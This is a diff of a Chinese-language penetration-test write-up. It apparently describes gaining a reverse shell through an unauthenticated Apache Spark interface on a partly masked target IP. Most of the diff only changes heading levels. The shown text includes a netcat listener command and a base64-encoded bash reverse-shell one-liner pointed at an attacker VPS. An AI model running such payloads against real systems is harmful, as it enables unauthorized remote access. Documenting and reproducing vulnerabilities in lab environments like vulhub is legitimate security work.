@@ -1,10 +1,10 @@
-### 0x01 打点发现
+# 0x01 打点发现
 团队一起做项目，同事发现一个Apache Spark未授权页面，我这边尝试打点，遂有此文
-### 0x02 初次尝试
+# 0x02 初次尝试
 目标地址：  http://182.61.xxx.xxx:8080  
 网上搜索针对Apache Spark的漏洞复现，用POC直接打，不出意外的攻击失败  
 （这里记录一下：阿里云vps开启nc监听时，需要加个参数n，即nc -lnvvvp 101.200.xx.xx 8888，具体原因未知）  
-### 0x03 本地调试
+# 0x03 本地调试
 本地搭建环境，使用vulhub项目中的环境：https://github.com/vulhub/vulhub/tree/master/spark/unacc  
 （这里记录一下：搭建环境时，发现端口被占用，netstat -antup查不到占用端口的pid和进程名，原因是权限不够，改用sudo netstat -antup可查到占用端口的pid和进程名，有时容易忽略使用sudo）  
 
@@ -83,7 +83,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGxxxxxxxxxxxxEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{bas
 再次执行后成功接收到反弹shell  
 ![image](./pic/1.png)  
 
-### 参考链接：  
+# 参考链接：  
 https://www.cnblogs.com/mutudou/p/14685277.html  
 https://medium.com/@Wh0ale/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-ada9eb02af65  
 https://github.com/vulhub/vulhub/tree/master/spark/unacc  
